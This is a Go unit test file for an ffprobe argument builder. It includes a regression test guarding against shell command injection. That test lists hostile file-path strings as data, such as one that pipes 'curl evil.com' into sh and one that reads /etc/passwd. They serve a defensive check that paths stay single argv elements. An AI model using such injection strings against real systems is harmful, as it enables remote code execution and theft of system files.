package encoder

import (
	"reflect"
	"strings"
	"testing"
)

func TestBuildFFProbeArgs_BaselineMinimum(t *testing.T) {
	got := buildFFProbeArgs("/data/video.mp4", "", 4, false, false)
	want := []string{
		"-v", "warning",
		"-print_format", "json",
		"-show_streams",
		"-show_format",
		"-i", "/data/video.mp4",
		"-threads", "4",
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("buildFFProbeArgs baseline: got %v, want %v", got, want)
	}
}

func TestBuildFFProbeArgs_AddsExtractChapters(t *testing.T) {
	got := buildFFProbeArgs("/data/video.mp4", "", 1, true, false)
	if !containsArgPair(got, "-show_chapters", "") {
		// -show_chapters is a flag without a paired value; verify
		// it is present and ordered before -i.
		idxFlag := indexOf(got, "-show_chapters")
		idxInput := indexOf(got, "-i")
		if idxFlag < 0 {
			t.Fatalf("-show_chapters flag missing: %v", got)
		}
		if idxFlag > idxInput {
			t.Fatalf("-show_chapters must precede -i: %v", got)
		}
	}
}

func TestBuildFFProbeArgs_OmitsHeadersForNonHTTP(t *testing.T) {
	got := buildFFProbeArgs("/data/video.mp4", "Cookie: x=y", 1, false, false)
	if indexOf(got, "-headers") >= 0 {
		t.Fatalf("non-HTTP protocol must not emit -headers: %v", got)
	}
}

func TestBuildFFProbeArgs_OmitsEmptyHeaders(t *testing.T) {
	got := buildFFProbeArgs("/data/video.mp4", "", 1, false, true)
	if indexOf(got, "-headers") >= 0 {
		t.Fatalf("empty headers must not emit -headers: %v", got)
	}
}

func TestBuildFFProbeArgs_PassesHeadersAsSingleArgvElement(t *testing.T) {
	headers := "Cookie: a=b\r\nX-Custom: c d"
	got := buildFFProbeArgs("/data/video.mp4", headers, 1, false, true)
	idx := indexOf(got, "-headers")
	if idx < 0 || idx+1 >= len(got) {
		t.Fatalf("-headers value missing: %v", got)
	}
	if got[idx+1] != headers {
		t.Fatalf("-headers value altered: got %q, want %q", got[idx+1], headers)
	}
}

// TestBuildFFProbeArgs_ShellMetacharactersInPathArePreserved is a
// regression test for the previous "sh -c" implementation. An input
// path containing shell metacharacters used to be evaluated by the
// shell because the whole command line was concatenated into a single
// string. With argv, the path is delivered verbatim to ffprobe, so:
//
//   - it appears as the value of -i with no field splitting;
//   - it is NEVER split or modified, even if it contains spaces,
//     semicolons, backticks, dollar signs, ampersands, or pipes.
//
// We assert the value is a single argv element so the regression
// (executing trailing commands) can never recur via this helper.
func TestBuildFFProbeArgs_ShellMetacharactersInPathArePreserved(t *testing.T) {
	hostile := []string{
		"/tmp/foo;curl evil.com|sh",
		"/tmp/$(whoami).mp4",
		"/tmp/`id`.mp4",
		"/tmp/foo bar.mp4",
		"/tmp/foo&&id",
		"/tmp/foo|cat /etc/passwd",
	}
	for _, p := range hostile {
		t.Run(p, func(t *testing.T) {
			got := buildFFProbeArgs(p, "", 1, false, false)
			idx := indexOf(got, "-i")
			if idx < 0 || idx+1 >= len(got) {
				t.Fatalf("-i value missing: %v", got)
			}
			if got[idx+1] != p {
				t.Fatalf("-i value altered: got %q, want %q", got[idx+1], p)
			}
			joined := strings.Join(got, " ")
			for _, c := range []string{"sh -c", "$(", "`"} {
				if strings.Contains(joined, c) && !strings.Contains(p, c) {
					t.Fatalf("argv leaked shell construct %q (joined=%q)", c, joined)
				}
			}
		})
	}
}

func TestBuildFFProbeArgs_ThreadsAreFormattedAsDecimal(t *testing.T) {
	got := buildFFProbeArgs("/data/video.mp4", "", 12, false, false)
	idx := indexOf(got, "-threads")
	if idx < 0 || idx+1 >= len(got) {
		t.Fatalf("-threads value missing: %v", got)
	}
	if got[idx+1] != "12" {
		t.Fatalf("-threads value: got %q, want %q", got[idx+1], "12")
	}
}

func indexOf(s []string, target string) int {
	for i, v := range s {
		if v == target {
			return i
		}
	}
	return -1
}

func containsArgPair(s []string, flag, value string) bool {
	idx := indexOf(s, flag)
	if idx < 0 {
		return false
	}
	if value == "" {
		return true
	}
	return idx+1 < len(s) && s[idx+1] == value
}
